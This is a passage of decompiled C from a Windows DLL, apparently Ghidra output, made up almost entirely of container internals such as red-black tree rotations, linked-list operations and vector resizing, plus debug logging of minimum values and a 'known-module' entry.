  }
  local_20 = 0xffffffff;
  local_38 = (undefined4 *)FUN_100582fa(8);
  if (local_38 == (undefined4 *)0x0) {
    local_38 = (undefined4 *)0x0;
  }
  else {
    *local_38 = 0xffffffff;
    local_38[1] = 0xffffffff;
  }
  local_34 = 0;
  local_8._0_1_ = 10;
  if ((local_78 != 0) && (piVar6 = (int *)local_7c[1], piVar6[1] != 0)) {
    iVar13 = *(int *)(*piVar6 + 4);
    uVar9 = extraout_ECX_18;
    local_c4 = iVar13;
    local_c0 = piVar6;
    for (iVar4 = iVar13; iVar4 != -1; iVar4 = *(int *)(iVar4 + 4)) {
      local_124 = FUN_10017ca0();
      puVar10 = (uint *)FUN_100171d0(&local_124);
      uVar2 = *puVar10;
      if (uVar2 < local_20) {
        iVar13 = iVar4;
        local_c4 = iVar4;
        local_c0 = piVar6;
        local_20 = uVar2;
      }
      pcVar16 = " minVal:";
      uVar17 = local_20;
      uVar18 = local_20;
      FUN_10017c80(&DAT_10083fbc);
      FUN_10017bf0(uVar2);
      FUN_10017c80(pcVar16);
      FUN_10017bf0(uVar17);
      FUN_10017c10(uVar18);
      uVar9 = extraout_ECX_19;
    }
    uVar2 = local_20;
    FUN_10017c80("minVal=");
    FUN_10017bf0(uVar2);
    FUN_10017c10(uVar9);
    local_d8 = 0xffffffff;
    local_e0 = iVar13;
    local_dc = piVar6;
    local_d4 = piVar6;
    cVar1 = FUN_10017020(&local_d8);
    if (cVar1 != '\0') {
      local_d8 = 0xffffffff;
      local_d4 = piVar6;
      do {
        local_118 = FUN_10017ca0();
        puVar8 = (undefined4 *)FUN_100171d0(&local_118);
        local_f8 = *puVar8;
        FUN_10017040(&local_f8);
        iVar13 = *(int *)(iVar13 + 4);
        local_e0 = iVar13;
        cVar1 = FUN_10017020(&local_d8);
      } while (cVar1 != '\0');
    }
    iVar4 = *(int *)(*piVar6 + 4);
    local_f0 = iVar4;
    local_ec = piVar6;
    cVar1 = FUN_10017020(&local_c4);
    while (cVar1 != '\0') {
      local_fc = FUN_10017ca0();
      puVar8 = (undefined4 *)FUN_100171d0(&local_fc);
      local_104 = *puVar8;
      FUN_10017040(&local_104);
      iVar4 = *(int *)(iVar4 + 4);
      local_f0 = iVar4;
      cVar1 = FUN_10017020(&local_c4);
    }
  }
  for (puVar8 = (undefined4 *)local_38[1]; puVar8 != (undefined4 *)0xffffffff;
      puVar8 = (undefined4 *)puVar8[1]) {
    puVar5 = (undefined4 *)FUN_10022ee0(*puVar8);
    if (puVar5 != (undefined4 *)0x0) {
      local_50 = 0;
      local_8._0_1_ = 0xb;
      local_50 = FUN_10010440(*puVar5);
      cVar1 = FUN_1003d9a0();
      if (cVar1 != '\0') {
        FUN_10006f30();
        goto LAB_10016bfc;
      }
      local_8._0_1_ = 10;
      FUN_10006f30();
    }
  }
  piVar6 = *(int **)*param_3;
  if (piVar6 != (int *)*param_3) {
    do {
      cVar1 = FUN_1003d9a0();
      if (cVar1 != '\0') break;
      piVar6 = (int *)*piVar6;
    } while (piVar6 != (int *)*param_3);
  }
  if (piVar6 != (int *)*param_3) {
    iVar4 = piVar6[3];
    local_11c = iVar4;
    FUN_100170a0(&local_11c);
    uVar9 = extraout_ECX_20;
    FUN_10017c80("injected known-module=");
    FUN_10017bf0(iVar4);
    FUN_10017c10(uVar9);
  }
LAB_10016bfc:
  if (local_34 != 0) {
    *(undefined4 *)(local_10c + 8) = *(undefined4 *)local_38[1];
    FUN_10016fc0();
    local_cc = 0xffffffff;
    puVar8 = (undefined4 *)local_38[1];
    local_e4 = &local_38;
    local_e8 = puVar8;
    local_c8 = local_e4;
    cVar1 = FUN_10017020(&local_cc);
    if (cVar1 != '\0') {
      local_c8 = &local_38;
      local_cc = 0xffffffff;
      do {
        local_108 = *puVar8;
        FUN_10016ff0(&local_108);
        puVar8 = (undefined4 *)puVar8[1];
        local_e8 = puVar8;
        cVar1 = FUN_10017020(&local_cc);
      } while (cVar1 != '\0');
    }
  }
  FUN_10015ce0();
  FUN_10015b30();
  FUN_10015d30();
  thunk_FUN_100579ee(local_4c);
  FUN_10017bc0();
  FUN_10017380(local_164,*local_28,local_28);
  thunk_FUN_100579ee(local_28);
  thunk_FUN_100579ee(local_a4);
  FUN_10016f20();
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10016d20 */

void __fastcall FUN_10016d20(int param_1)

{
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0x14));
  FUN_10016f20();
  return;
}



/* Function: FUN_10016d40 */

void __fastcall FUN_10016d40(undefined4 *param_1)

{
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_10017380(&local_8,*(undefined4 *)*param_1,(undefined4 *)*param_1);
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10016d70 */

int * __thiscall FUN_10016d70(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_10074d7b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (param_1 != param_2) {
    FUN_10015d30(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    puVar3 = (undefined4 *)FUN_100582fa(8);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = (undefined4 *)0x0;
    }
    else {
      *puVar3 = 0xffffffff;
      puVar3[1] = 0xffffffff;
    }
    *param_1 = (int)puVar3;
    param_1[1] = 0;
    for (iVar1 = *(int *)(*param_2 + 4); iVar1 != -1; iVar1 = *(int *)(iVar1 + 0xc)) {
      iVar4 = FUN_100582fa(0x14);
      local_8 = 0;
      if (iVar4 == 0) {
        iVar4 = 0;
      }
      else {
        FUN_10015dc0(iVar1);
        *(undefined4 *)(iVar4 + 8) = *(undefined4 *)(iVar1 + 8);
        *(undefined4 *)(iVar4 + 0xc) = 0xffffffff;
        *(undefined4 *)(iVar4 + 0x10) = 0xffffffff;
      }
      local_8 = 0xffffffff;
      iVar2 = *(int *)*param_1;
      if (iVar2 == -1) {
        *(int *)*param_1 = iVar4;
        *(int *)(*param_1 + 4) = iVar4;
      }
      else {
        *(int *)(iVar2 + 0xc) = iVar4;
        *(undefined4 *)(iVar4 + 0x10) = *(undefined4 *)*param_1;
        *(int *)*param_1 = iVar4;
      }
      param_1[1] = param_1[1] + 1;
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10016e70 */

undefined4 * __fastcall FUN_10016e70(undefined4 *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074db0;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  uVar2 = FUN_100178c0(0,0);
  *param_1 = uVar2;
  local_8 = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  uVar2 = FUN_1000fa00(0,0);
  param_1[2] = uVar2;
  local_8 = 1;
  uVar2 = FUN_100582fa(1,uVar1);
  param_1[5] = uVar2;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10016f20 */

void __fastcall FUN_10016f20(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  
  piVar3 = *(int **)param_1[2];
  if (piVar3 != (int *)param_1[2]) {
    do {
      iVar1 = piVar3[2];
      if (iVar1 != 0) {
        FUN_10017110();
        thunk_FUN_100579ee(iVar1);
      }
      piVar3 = (int *)*piVar3;
    } while (piVar3 != (int *)param_1[2]);
  }
  piVar3 = (int *)param_1[2];
  piVar2 = (int *)*piVar3;
  *piVar3 = (int)piVar3;
  *(int *)(param_1[2] + 4) = param_1[2];
  param_1[3] = 0;
  if (piVar2 != (int *)param_1[2]) {
    do {
      piVar3 = (int *)*piVar2;
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar3;
    } while (piVar3 != (int *)param_1[2]);
  }
  thunk_FUN_100579ee(param_1[2]);
  piVar3 = (int *)*param_1;
  piVar2 = (int *)*piVar3;
  *piVar3 = (int)piVar3;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar2 != (int *)*param_1) {
    do {
      piVar3 = (int *)*piVar2;
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar3;
    } while (piVar3 != (int *)*param_1);
  }
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10016fc0 */

void __fastcall FUN_10016fc0(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    FUN_10017250(iVar1,iVar1 + param_1[1] * 4);
    return;
  }
  FUN_10017250(0,0);
  return;
}



/* Function: FUN_10016fe0 */

int __fastcall FUN_10016fe0(int *param_1)

{
  if (*param_1 != 0) {
    return *param_1 + param_1[1] * 4;
  }
  return 0;
}



/* Function: FUN_10016ff0 */

void __thiscall FUN_10016ff0(int *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  
  if ((uint)param_1[2] <= (uint)param_1[1]) {
    FUN_100172c0(param_1[1] + 1);
  }
  puVar1 = (undefined4 *)(*param_1 + param_1[1] * 4);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = *param_2;
  }
  param_1[1] = param_1[1] + 1;
  return;
}



/* Function: FUN_10017020 */

uint __thiscall FUN_10017020(uint *param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = param_1[1];
  if ((uVar1 == param_2[1]) && (uVar1 = *param_1, uVar1 == *param_2)) {
    return uVar1 & 0xffffff00;
  }
  return CONCAT31((int3)(uVar1 >> 8),1);
}



/* Function: FUN_10017040 */

void __thiscall FUN_10017040(int *param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)FUN_100582fa(0xc);
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *puVar2 = *param_2;
    puVar2[1] = 0xffffffff;
    puVar2[2] = 0xffffffff;
  }
  iVar1 = *(int *)*param_1;
  if (iVar1 != -1) {
    *(undefined4 **)(iVar1 + 4) = puVar2;
    puVar2[2] = *(undefined4 *)*param_1;
    *(undefined4 **)*param_1 = puVar2;
    param_1[1] = param_1[1] + 1;
    return;
  }
  *(int *)*param_1 = (int)puVar2;
  *(undefined4 **)(*param_1 + 4) = puVar2;
  param_1[1] = param_1[1] + 1;
  return;
}



/* Function: FUN_100170a0 */

void __thiscall FUN_100170a0(int *param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)FUN_100582fa(0xc);
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *puVar2 = *param_2;
    puVar2[1] = 0xffffffff;
    puVar2[2] = 0xffffffff;
  }
  iVar1 = ((undefined4 *)*param_1)[1];
  if (iVar1 != -1) {
    *(undefined4 **)(iVar1 + 8) = puVar2;
    puVar2[1] = *(undefined4 *)(*param_1 + 4);
    *(undefined4 **)(*param_1 + 4) = puVar2;
    param_1[1] = param_1[1] + 1;
    return;
  }
  *(undefined4 *)*param_1 = puVar2;
  *(undefined4 **)(*param_1 + 4) = puVar2;
  param_1[1] = param_1[1] + 1;
  return;
}



/* Function: FUN_10017110 */

void __fastcall FUN_10017110(int *param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar1 = (int *)param_1[2];
  piVar2 = (int *)*piVar1;
  *piVar1 = (int)piVar1;
  *(int *)(param_1[2] + 4) = param_1[2];
  param_1[3] = 0;
  if (piVar2 != (int *)param_1[2]) {
    do {
      piVar1 = (int *)*piVar2;
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar1;
    } while (piVar1 != (int *)param_1[2]);
  }
  thunk_FUN_100579ee(param_1[2]);
  piVar1 = (int *)*param_1;
  piVar2 = (int *)*piVar1;
  *piVar1 = (int)piVar1;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar2 != (int *)*param_1) {
    do {
      piVar1 = (int *)*piVar2;
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar1;
    } while (piVar1 != (int *)*param_1);
  }
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10017190 */

void __fastcall FUN_10017190(int *param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar1 = (int *)*param_1;
  piVar2 = (int *)*piVar1;
  *piVar1 = (int)piVar1;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar2 != (int *)*param_1) {
    do {
      piVar1 = (int *)*piVar2;
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar1;
    } while (piVar1 != (int *)*param_1);
  }
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_100171d0 */

uint * __thiscall FUN_100171d0(int *param_1,uint *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  
  puVar1 = (undefined4 *)*param_1;
  puVar5 = puVar1;
  if (*(char *)((int)puVar1[1] + 0xd) == '\0') {
    puVar2 = (undefined4 *)puVar1[1];
    do {
      if ((uint)puVar2[4] < *param_2) {
        puVar3 = (undefined4 *)puVar2[2];
      }
      else {
        puVar3 = (undefined4 *)*puVar2;
        puVar5 = puVar2;
      }
      puVar2 = puVar3;
    } while (*(char *)((int)puVar3 + 0xd) == '\0');
  }
  if ((puVar5 != puVar1) && ((uint)puVar5[4] <= *param_2)) {
    return puVar5 + 5;
  }
  iVar4 = FUN_10017e00(param_2,&param_2,param_2);
  FUN_10017e30(&param_2,puVar5,iVar4 + 0x10,iVar4);
  return param_2 + 5;
}



/* Function: FUN_10017250 */

uint __thiscall FUN_10017250(uint *param_1,uint param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  uVar2 = *param_1;
  if (uVar2 <= param_2) {
    if (uVar2 == 0) {
      return 0;
    }
    uVar1 = uVar2 + param_1[1] * 4;
    if ((((param_2 < uVar1) && (uVar2 < param_3)) && (param_3 <= uVar1)) && (param_2 < param_3)) {
      if (param_3 != param_2) {
        FUN_10017420(param_3,(int)(uVar1 - param_3) >> 2);
      }
      param_1[1] = param_1[1] - ((int)(param_3 - param_2) >> 2);
      return param_3;
    }
  }
  if (uVar2 == 0) {
    return 0;
  }
  return uVar2 + param_1[1] * 4;
}



/* Function: FUN_100172c0 */

void __thiscall FUN_100172c0(int *param_1,uint param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar3 = param_1[2];
  if (uVar3 < param_2) {
    if (*param_1 == 0) {
      uVar3 = 0x10;
      if (0x10 < param_2 + 1) {
        uVar3 = param_2 + 1;
      }
      uVar4 = uVar3 + 0xf & 0xfffffff0;
    }
    else if (param_2 < 0x10000) {
      if (uVar3 < 0x8000) {
        uVar4 = 0x10;
        if (0xf < uVar3) {
          uVar4 = uVar3;
        }
        do {
          uVar4 = uVar4 * 2;
        } while (uVar4 < param_2);
      }
      else {
        uVar4 = 0x10000;
      }
    }
    else {
      uVar4 = param_2 + 0xffff & 0xffff0000;
    }
    puVar1 = (undefined4 *)FUN_100581b4(uVar4 * 4);
    if (puVar1 != (undefined4 *)0x0) {
      uVar3 = 0;
      param_1[2] = uVar4;
      puVar2 = puVar1;
      if (param_1[1] != 0) {
        do {
          if (*param_1 == 0) break;
          if (puVar2 != (undefined4 *)0x0) {
            *puVar2 = *(undefined4 *)(*param_1 + uVar3 * 4);
          }
          uVar3 = uVar3 + 1;
          puVar2 = puVar2 + 1;
        } while (uVar3 < (uint)param_1[1]);
      }
      FUN_100579ee(*param_1);
      *param_1 = (int)puVar1;
    }
  }
  return;
}



/* Function: FUN_10017380 */

undefined4 * __thiscall
FUN_10017380(undefined4 *param_1,undefined4 *param_2,int *param_3,int *param_4)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  undefined4 *local_8;
  
  local_8 = param_1;
  if ((param_3 == *(int **)*param_1) && (param_4 == (int *)*param_1)) {
    FUN_100176f0();
    *param_2 = *(undefined4 *)*param_1;
    return param_2;
  }
  if (param_3 != param_4) {
    do {
      piVar3 = param_3;
      if (*(char *)((int)param_3 + 0xd) == '\0') {
        piVar2 = (int *)param_3[2];
        if (*(char *)((int)piVar2 + 0xd) == '\0') {
          cVar1 = *(char *)(*piVar2 + 0xd);
          param_3 = piVar2;
          piVar2 = (int *)*piVar2;
          while (cVar1 == '\0') {
            cVar1 = *(char *)(*piVar2 + 0xd);
            param_3 = piVar2;
            piVar2 = (int *)*piVar2;
          }
        }
        else {
          cVar1 = *(char *)(param_3[1] + 0xd);
          piVar4 = (int *)param_3[1];
          piVar2 = param_3;
          while ((param_3 = piVar4, cVar1 == '\0' && (piVar2 == (int *)param_3[2]))) {
            cVar1 = *(char *)(param_3[1] + 0xd);
            piVar4 = (int *)param_3[1];
            piVar2 = param_3;
          }
        }
      }
      FUN_10017480(&local_8,piVar3);
    } while (param_3 != param_4);
  }
  *param_2 = param_3;
  return param_2;
}



/* Function: FUN_10017420 */

void __thiscall FUN_10017420(undefined4 *param_1,undefined4 *param_2,int param_3)

{
  undefined4 *puVar1;
  int iVar2;
  
  if (param_1 < param_2) {
    if (param_3 != 0) {
      iVar2 = (int)param_2 - (int)param_1;
      do {
        if (param_1 != (undefined4 *)0x0) {
          *param_1 = *(undefined4 *)(iVar2 + (int)param_1);
        }
        param_1 = param_1 + 1;
        param_3 = param_3 + -1;
      } while (param_3 != 0);
      return;
    }
  }
  else if (param_3 != 0) {
    puVar1 = param_1 + param_3 + -1;
    do {
      if (puVar1 != (undefined4 *)0x0) {
        *puVar1 = *(undefined4 *)((int)puVar1 + ((int)param_2 - (int)param_1));
      }
      puVar1 = puVar1 + -1;
      param_3 = param_3 + -1;
    } while (param_3 != 0);
  }
  return;
}



/* Function: FUN_10017480 */

/* WARNING: Removing unreachable block (ram,0x10017547) */
/* WARNING: Removing unreachable block (ram,0x10017557) */
/* WARNING: Removing unreachable block (ram,0x10017560) */
/* WARNING: Removing unreachable block (ram,0x10017563) */
/* WARNING: Removing unreachable block (ram,0x10017553) */
/* WARNING: Removing unreachable block (ram,0x10017571) */
/* WARNING: Removing unreachable block (ram,0x1001757d) */
/* WARNING: Removing unreachable block (ram,0x10017588) */
/* WARNING: Removing unreachable block (ram,0x10017584) */
/* WARNING: Removing unreachable block (ram,0x10017578) */
/* WARNING: Removing unreachable block (ram,0x1001758b) */

void __thiscall FUN_10017480(int *param_1,undefined4 *param_2,int *param_3)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  undefined4 *puVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  
  FUN_10017870();
  piVar7 = (int *)*param_3;
  if (*(char *)((int)piVar7 + 0xd) == '\0') {
    if (*(char *)(param_3[2] + 0xd) == '\0') {
      piVar7 = (int *)param_3[2];
    }
  }
  else {
    piVar7 = (int *)param_3[2];
  }
  piVar5 = (int *)param_3[1];
  if (*(char *)((int)piVar7 + 0xd) == '\0') {
    piVar7[1] = (int)piVar5;
  }
  if (*(int **)(*param_1 + 4) == param_3) {
    *(int **)(*param_1 + 4) = piVar7;
  }
  else if ((int *)*piVar5 == param_3) {
    *piVar5 = (int)piVar7;
  }
  else {
    piVar5[2] = (int)piVar7;
  }
  puVar4 = (undefined4 *)*param_1;
  if ((int *)*puVar4 == param_3) {
    piVar6 = piVar5;
    if (*(char *)((int)piVar7 + 0xd) == '\0') {
      cVar1 = *(char *)(*piVar7 + 0xd);
      piVar2 = (int *)*piVar7;
      piVar6 = piVar7;
      while (piVar3 = piVar2, cVar1 == '\0') {
        piVar2 = (int *)*piVar3;
        cVar1 = *(char *)((int)piVar2 + 0xd);
        piVar6 = piVar3;
      }
      puVar4 = (undefined4 *)*param_1;
    }
    *puVar4 = piVar6;
  }
  if (*(int **)(*param_1 + 8) == param_3) {
    if (*(char *)((int)piVar7 + 0xd) == '\0') {
      cVar1 = *(char *)(piVar7[2] + 0xd);
      piVar6 = (int *)piVar7[2];
      piVar2 = piVar7;
      while (piVar3 = piVar6, cVar1 == '\0') {
        piVar6 = (int *)piVar3[2];
        cVar1 = *(char *)((int)piVar6 + 0xd);
        piVar2 = piVar3;
      }
      *(int **)(*param_1 + 8) = piVar2;
    }
    else {
      *(int **)(*param_1 + 8) = piVar5;
    }
  }
  if ((char)param_3[3] == '\x01') {
    if (piVar7 != *(int **)(*param_1 + 4)) {
      do {
        piVar6 = piVar5;
        if ((char)piVar7[3] != '\x01') break;
        piVar5 = (int *)*piVar6;
        if (piVar7 == piVar5) {
          piVar5 = (int *)piVar6[2];
          if ((char)piVar5[3] == '\0') {
            *(undefined1 *)(piVar5 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_10017780(piVar6);
            piVar5 = (int *)piVar6[2];
          }
          if (*(char *)((int)piVar5 + 0xd) == '\0') {
            if ((*(char *)(*piVar5 + 0xc) != '\x01') || (*(char *)(piVar5[2] + 0xc) != '\x01')) {
              if (*(char *)(piVar5[2] + 0xc) == '\x01') {
                *(undefined1 *)(*piVar5 + 0xc) = 1;
                *(undefined1 *)(piVar5 + 3) = 0;
                FUN_100177e0(piVar5);
                piVar5 = (int *)piVar6[2];
              }
              *(char *)(piVar5 + 3) = (char)piVar6[3];
              *(undefined1 *)(piVar6 + 3) = 1;
              *(undefined1 *)(piVar5[2] + 0xc) = 1;
              FUN_10017780(piVar6);
              break;
            }
LAB_1001766f:
            *(undefined1 *)(piVar5 + 3) = 0;
          }
        }
        else {
          if ((char)piVar5[3] == '\0') {
            *(undefined1 *)(piVar5 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_100177e0(piVar6);
            piVar5 = (int *)*piVar6;
          }
          if (*(char *)((int)piVar5 + 0xd) == '\0') {
            if ((*(char *)(piVar5[2] + 0xc) == '\x01') && (*(char *)(*piVar5 + 0xc) == '\x01'))
            goto LAB_1001766f;
            if (*(char *)(*piVar5 + 0xc) == '\x01') {
              *(undefined1 *)(piVar5[2] + 0xc) = 1;
              *(undefined1 *)(piVar5 + 3) = 0;
              FUN_10017780(piVar5);
              piVar5 = (int *)*piVar6;
            }
            *(char *)(piVar5 + 3) = (char)piVar6[3];
            *(undefined1 *)(piVar6 + 3) = 1;
            *(undefined1 *)(*piVar5 + 0xc) = 1;
            FUN_100177e0(piVar6);
            break;
          }
        }
        piVar5 = (int *)piVar6[1];
        piVar7 = piVar6;
      } while (piVar6 != *(int **)(*param_1 + 4));
    }
    *(undefined1 *)(piVar7 + 3) = 1;
  }
  thunk_FUN_100579ee(param_3);
  if (param_1[1] != 0) {
    param_1[1] = param_1[1] + -1;
  }
  *param_2 = param_3;
  return;
}



/* Function: FUN_100176f0 */

void __fastcall FUN_100176f0(int *param_1)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  
  cVar1 = *(char *)((int)*(int **)(*param_1 + 4) + 0xd);
  piVar3 = *(int **)(*param_1 + 4);
  while (cVar1 == '\0') {
    FUN_10017740(piVar3[2]);
    piVar2 = (int *)*piVar3;
    thunk_FUN_100579ee(piVar3);
    piVar3 = piVar2;
    cVar1 = *(char *)((int)piVar2 + 0xd);
  }
  *(int *)(*param_1 + 4) = *param_1;
  *(int *)*param_1 = *param_1;
  *(int *)(*param_1 + 8) = *param_1;
  param_1[1] = 0;
  return;
}



/* Function: FUN_10017740 */

void FUN_10017740(int *param_1)

{
  char cVar1;
  int *piVar2;
  
  cVar1 = *(char *)((int)param_1 + 0xd);
  while (cVar1 == '\0') {
    FUN_10017740(param_1[2]);
    piVar2 = (int *)*param_1;
    thunk_FUN_100579ee(param_1);
    param_1 = piVar2;
    cVar1 = *(char *)((int)piVar2 + 0xd);
  }
  return;
}



/* Function: FUN_10017780 */

void __thiscall FUN_10017780(int *param_1,int param_2)

{
  int *piVar1;
  int *piVar2;
  
  piVar1 = *(int **)(param_2 + 8);
  *(int *)(param_2 + 8) = *piVar1;
  if (*(char *)(*piVar1 + 0xd) == '\0') {
    *(int *)(*piVar1 + 4) = param_2;
  }
  piVar1[1] = *(int *)(param_2 + 4);
  if (param_2 == *(int *)(*param_1 + 4)) {
    *(int **)(*param_1 + 4) = piVar1;
    *piVar1 = param_2;
    *(int **)(param_2 + 4) = piVar1;
    return;
  }
  piVar2 = *(int **)(param_2 + 4);
  if (param_2 == *piVar2) {
    *piVar2 = (int)piVar1;
    *piVar1 = param_2;
    *(int **)(param_2 + 4) = piVar1;
    return;
  }
  piVar2[2] = (int)piVar1;
  *piVar1 = param_2;
  *(int **)(param_2 + 4) = piVar1;
  return;
}



/* Function: FUN_100177e0 */

void __thiscall FUN_100177e0(int *param_1,int *param_2)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = *param_2;
  *param_2 = *(int *)(iVar1 + 8);
  if (*(char *)(*(int *)(iVar1 + 8) + 0xd) == '\0') {
    *(int **)(*(int *)(iVar1 + 8) + 4) = param_2;
  }
  *(int *)(iVar1 + 4) = param_2[1];
  if (param_2 == *(int **)(*param_1 + 4)) {
    *(int *)(*param_1 + 4) = iVar1;
    *(int **)(iVar1 + 8) = param_2;
    param_2[1] = iVar1;
    return;
  }
  piVar2 = (int *)param_2[1];
  if (param_2 == (int *)piVar2[2]) {
    piVar2[2] = iVar1;
    *(int **)(iVar1 + 8) = param_2;
    param_2[1] = iVar1;
    return;
  }
  *piVar2 = iVar1;
  *(int **)(iVar1 + 8) = param_2;
  param_2[1] = iVar1;
  return;
}



/* Function: FUN_10017840 */

void FUN_10017840(void)

{
  code *pcVar1;
  int iVar2;
  undefined **appuStack_14 [3];
  char *pcStack_8;
  
  pcStack_8 = (char *)0x10017847;
  iVar2 = FUN_100582fa();
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    return;
  }
  pcStack_8 = "bad allocation";
  FUN_1005855d(&pcStack_8,1);
  appuStack_14[0] = std::bad_alloc::vftable;
  FUN_1005de1b(appuStack_14,&DAT_1009254c);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10017870 */

int * __fastcall FUN_10017870(int *param_1)

{
  char cVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  
  iVar2 = *param_1;
  if (*(char *)(iVar2 + 0xd) == '\0') {
    piVar3 = *(int **)(iVar2 + 8);
    if (*(char *)((int)piVar3 + 0xd) == '\0') {
      cVar1 = *(char *)(*piVar3 + 0xd);
      piVar4 = (int *)*piVar3;
      while (cVar1 == '\0') {
        cVar1 = *(char *)(*piVar4 + 0xd);
        piVar3 = piVar4;
        piVar4 = (int *)*piVar4;
      }
      *param_1 = (int)piVar3;
      return param_1;
    }
    iVar2 = *(int *)(iVar2 + 4);
    cVar1 = *(char *)(iVar2 + 0xd);
    while ((cVar1 == '\0' && (*param_1 == *(int *)(iVar2 + 8)))) {
      *param_1 = iVar2;
      iVar2 = *(int *)(iVar2 + 4);
      cVar1 = *(char *)(iVar2 + 0xd);
    }
    *param_1 = iVar2;
  }
  return param_1;
}



/* Function: FUN_100178c0 */

void FUN_100178c0(int *param_1,int *param_2)

{
  code *pcVar1;
  int *piVar2;
  
  piVar2 = (int *)FUN_100582fa(0x18);
  if (piVar2 == (int *)0x0) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = piVar2;
    param_2 = piVar2;
  }
  *piVar2 = (int)param_1;
  if (piVar2 + 1 != (int *)0x0) {
    piVar2[1] = (int)param_2;
  }
  return;
}



/* Function: FUN_10017900 */

int * __thiscall FUN_10017900(int *param_1,int param_2,int *param_3,int param_4,int *param_5)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074de3;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  puVar3 = (undefined4 *)FUN_100582fa(8,uVar2);
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    *puVar3 = 0xffffffff;
    puVar3[1] = 0xffffffff;
  }
  *param_1 = (int)puVar3;
  param_1[1] = 0;
  local_8._1_3_ = 0;
  while (((local_8._0_1_ = 0, param_3 != param_5 || (param_2 != param_4)) &&
         ((param_3 != param_1 || (param_2 != -1))))) {
    iVar4 = FUN_100582fa(0x14,uVar2);
    local_8._0_1_ = 1;
    if (iVar4 == 0) {
      iVar4 = 0;
    }
    else {
      FUN_10015dc0(param_2);
      *(undefined4 *)(iVar4 + 8) = *(undefined4 *)(param_2 + 8);
      *(undefined4 *)(iVar4 + 0xc) = 0xffffffff;
      *(undefined4 *)(iVar4 + 0x10) = 0xffffffff;
    }
    iVar1 = *(int *)*param_1;
    if (iVar1 == -1) {
      *(int *)*param_1 = iVar4;
      *(int *)(*param_1 + 4) = iVar4;
      param_1[1] = param_1[1] + 1;
      param_2 = *(int *)(param_2 + 0xc);
    }
    else {
      *(int *)(iVar1 + 0xc) = iVar4;
      *(undefined4 *)(iVar4 + 0x10) = *(undefined4 *)*param_1;
      *(int *)*param_1 = iVar4;
